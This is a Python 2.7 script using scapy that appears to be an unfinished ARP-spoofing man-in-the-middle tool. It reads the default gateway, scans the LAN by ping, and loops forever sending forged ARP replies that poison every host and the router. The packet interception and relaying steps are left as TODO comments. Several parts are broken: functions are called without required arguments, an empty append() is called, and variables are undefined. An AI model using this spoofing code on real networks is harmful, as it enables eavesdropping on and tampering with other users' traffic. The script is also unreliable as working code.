#python 2.7

try:
    import logging,subprocess,re, threading,time,socket,struct
    from scapy.all import *
except ImportError:

    #TODO: handle all cases of missing modules and try to solve
    print 'a module is missing please check you have all required modules'

def getDefaultGateway():
    """Read the default gateway directly from /proc."""
    with open("/proc/net/route") as fh:
        for line in fh:
            fields = line.strip().split()
            if fields[1] != '00000000' or not int(fields[3], 16) & 2:
                continue

            return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))

def getSubnetMask(ip):
    proc = subprocess.Popen('ifconfig',stdout=subprocess.PIPE)
    while True:
        line = proc.stdout.readline()
        if ip.encode() in line:
            break
    mask = line.rstrip().split(b':')[-1].replace(b' ',b'').decode()
    return mask

def getLocalAddrss(defaultGateway,subnetMask):
    """
    returns a dictionary of all LAN IP addresses and their coresponding MAC address"""

    localIPAddresses=[]
    maskParts=subnetMask.split('.')
    IPstart='.'.join(defaultGateway.split('.')[0:2])+'.'
    if maskParts[2]=='255':
        for i in range(int(defaultGateway.split('.')[-1]),int(maskParts[-1])):
            output = subprocess.Popen(['ping', '-n', '1', '-w', '500',(IPstart+str(i))], stdout=subprocess.PIPE, startupinfo=info).communicate()[0]

            if "Destination host unreachable" in output.decode('utf-8'):
                pass
                #print(str(all_hosts[i]), "is Offline")
            elif "Request timed out" in output.decode('utf-8'):
                pass
                #print(str(all_hosts[i]), "is Offline")
            else:
                localIPAddresses.append()


    print localIPAddresses

def arpSpoof(localAddresses,defaultGateway,localMAC):
    """
    every 30 seconds send ARP broadcast to spoof all machines on LAN"""

    while True:
        for ip in localAddresses.keys():
            if ip != defaultGateway:
                #create arp packets
                victimPacket = Ether(src=localMAC,dst=localAddresses[ip])/ARP(op=2, hwsrc=localMAC,psrc = defaultGateway, pdst=ip, hwdst = localAddresses[ip])
                #victimPacket.show()
                gatewayPacket=Ether(dst=localAddresses[defaultGateway],src=localMAC)/ARP(op=2,hwsrc=localMAC,psrc=ip,hwdst=localAddresses[defaultGateway],pdst=defaultGateway)
                #gatewayPacket.show()

                #send packets
                sendp(victimPacket)
                sendp(gatewayPacket)
        time.sleep(30)



def main():
    """
    control the whole program
    gets the parameters for working
    then calls all functions in order
    """

    #setup logging to file logFile.txt
    logging.basicConfig(filename='logFile.txt',level=logging.DEBUG, format=' %(asctime)s - %(levelname)s - %(message)s')
    logging.info('\n\n\n\n\n########## Program Start ##########\n\n')

    #get default gateway
    defaultGateway=getDefaultGateway()
    logging.debug('got default gateway')

    #get subnet mask
    subnetMask=getSubnetMask(defaultGateway)
    #create a dictionary of local IP addresses and MAC addresses
    localAddresses=getLocalAddrss()
    logging.debug('created dictionary with all IP and MAC addresses on LAN')

    arpThread=threading.Thread(target=arpSpoof,args=(localAddresses,defaultGateway,localMAC,))
    arpThread.start()
    logging.debug('created thread for ARP spoofing')

    while True: #main loop

        #TODO:check if user wants to stop
        #TODO:listen for packets
        #TODO:save packet
        #TODO:send packet to router
        #TODO:listen to response from router
        #TODO:save response
        #TODO:send packet to original host
        #TODO:save packets to file
        break




if __name__=='__main__':
    main()
